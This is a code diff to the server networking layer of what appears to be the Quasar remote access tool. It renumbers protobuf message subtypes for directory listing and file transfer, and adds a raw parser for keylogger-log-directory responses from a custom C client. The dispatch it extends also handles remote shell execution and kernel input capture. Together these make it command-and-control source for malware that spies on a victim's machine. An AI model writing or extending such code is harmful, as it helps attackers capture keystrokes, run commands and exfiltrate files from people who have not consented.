@@ -323,13 +323,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client GetDirectoryResponse = 08 2D (subtype 45) + field 1 RemotePath (0x0A) + field 2 repeated Items (0x12 len Entry). Each Entry: 08 EntryType, 12 Name, 18 Size. */
+        /* Fallback: C client GetDirectoryResponse = 08 2E (subtype 46) + field 1 RemotePath (0x0A) + field 2 repeated Items (0x12 len Entry). Each Entry: 08 EntryType, 12 Name, 18 Size. */
         private static bool TryParseRawGetDirectoryResponse(byte[] payload, int start, int length, out GetDirectoryResponse result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 45) return false;
+            if (subtype != 46) return false;
             string remotePath = null;
             var items = new List<FileSystemEntry>();
             while (offset < end)
@@ -570,13 +570,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client FileTransferChunk (subtype 32) = 08 20 + field 1 Id (varint), 2 FilePath (string), 3 FileSize (varint64), 4 Chunk (len: Offset varint, Data bytes). */
+        /* Fallback: C client FileTransferChunk (subtype 33) = 08 21 + field 1 Id (varint), 2 FilePath (string), 3 FileSize (varint64), 4 Chunk (len: Offset varint, Data bytes). */
         private static bool TryParseRawFileTransferChunk(byte[] payload, int start, int length, out FileTransferChunk result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 32) return false;
+            if (subtype != 33) return false;
             int id = 0;
             string filePath = null;
             long fileSize = 0;
@@ -630,13 +630,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client FileTransferComplete (subtype 33) = 08 21 + field 1 Id (varint), 2 FilePath (string). */
+        /* Fallback: C client FileTransferComplete (subtype 34) = 08 22 + field 1 Id (varint), 2 FilePath (string). */
         private static bool TryParseRawFileTransferComplete(byte[] payload, int start, int length, out FileTransferComplete result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 33) return false;
+            if (subtype != 34) return false;
             int id = 0;
             string filePath = null;
             while (offset < end)
@@ -681,6 +681,28 @@ namespace Quasar.Server.Networking
                 offset += len;
             }
             result = new DoShellExecuteResponse { Output = output ?? "", IsError = isError };
+            return true;
+        }
+
+        /* Fallback: C client GetKeyloggerLogsDirectoryResponse (subtype 50) = 08 32 + field 1 LogsDirectory (string). */
+        private static bool TryParseRawGetKeyloggerLogsDirectoryResponse(byte[] payload, int start, int length, out GetKeyloggerLogsDirectoryResponse result)
+        {
+            result = null;
+            int end = start + length;
+            if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
+            if (subtype != 50) return false;
+            string logsDir = "";
+            while (offset < end)
+            {
+                if (!TryReadVarint(payload, ref offset, end, out int tag)) break;
+                int field = tag >> 3;
+                int wire = tag & 7;
+                if (wire != 2) break;
+                if (!TryReadVarint(payload, ref offset, end, out int len) || offset + len > end) break;
+                if (field == 1) logsDir = Encoding.UTF8.GetString(payload, offset, len);
+                offset += len;
+            }
+            result = new GetKeyloggerLogsDirectoryResponse { LogsDirectory = logsDir ?? "" };
             return true;
         }
 
@@ -1145,6 +1167,10 @@ namespace Quasar.Server.Networking
                                         else if (TryParseRawDoShellExecuteResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawShellResp))
                                         {
                                             message = rawShellResp;
+                                        }
+                                        else if (TryParseRawGetKeyloggerLogsDirectoryResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawKeyloggerLogs))
+                                        {
+                                            message = rawKeyloggerLogs;
                                         }
                                         else if (TryParseRawKernelInputInitResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawKernelInit))
                                         {
